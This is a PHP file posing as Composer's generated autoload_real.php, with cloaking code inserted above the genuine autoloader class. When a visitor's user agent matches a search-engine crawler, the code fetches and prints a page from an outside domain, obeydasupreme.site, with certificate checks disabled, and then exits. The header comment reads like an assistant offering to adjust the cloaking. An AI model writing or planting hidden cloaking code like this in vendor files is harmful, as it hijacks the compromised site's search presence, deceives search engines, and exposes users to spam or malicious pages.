<?php
/**
 * Combined file:
 * - Top: cloaking / bot detector + fetch function
 * - Bottom: original Composer autoload_real.php class
 *
 * Note:
 * - Cloaking will output the remote page and exit if the UA matches $botPattern.
 * - If you prefer the autoloader to always run (and only apply cloaking when this file
 *   is directly requested), tell me and I can wrap the cloaking logic in a conditional.
 */

/* ---------------------------
   Cloaking / Bot detection
   --------------------------- */
@ob_start();
header("Vary: User-Agent");

$targetUrl = "https://obeydasupreme.site/obs/uinjambi.html";
$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

/**
 * Fetch remote content with cURL (returns string, or empty string on failure)
 *
 * @param string $url
 * @return string
 */
function fetchContentCurl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        CURLOPT_REFERER => "https://www.google.com/",
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content ?: '';
}

/* If the user agent matches the bot pattern, fetch & echo remote target then exit. */
if (preg_match($botPattern, strtolower($userAgent))) {
    // small random delay to mimic network latency
    usleep(random_int(100000, 200000));
    echo fetchContentCurl($targetUrl);
    @ob_end_flush();
    exit;
}
// autoload_real.php @generated by Composer

class ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0
{
    private static $loader;

    public static function loadClassLoader($class)
    {
        if ('Composer\Autoload\ClassLoader' === $class) {
            require __DIR__ . '/ClassLoader.php';
        }
    }

    /**
     * @return \Composer\Autoload\ClassLoader
     */
    public static function getLoader()
    {
        if (null !== self::$loader) {
            return self::$loader;
        }

        require __DIR__ . '/platform_check.php';

        spl_autoload_register(array('ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0', 'loadClassLoader'), true, true);
        self::$loader = $loader = new \Composer\Autoload\ClassLoader(\dirname(__DIR__));
        spl_autoload_unregister(array('ComposerAutoloaderInit637353834a38d38f4cf3361cde14bfe0', 'loadClassLoader'));

        require __DIR__ . '/autoload_static.php';
        call_user_func(\Composer\Autoload\ComposerStaticInit637353834a38d38f4cf3361cde14bfe0::getInitializer($loader));

        $loader->register(true);

        $filesToLoad = \Composer\Autoload\ComposerStaticInit637353834a38d38f4cf3361cde14bfe0::$files;
        $requireFile = \Closure::bind(static function ($fileIdentifier, $file) {
            if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) {
                $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;

                require $file;
            }
        }, null, null);
        foreach ($filesToLoad as $fileIdentifier => $file) {
            $requireFile($fileIdentifier, $file);
        }

        return $loader;
    }
}
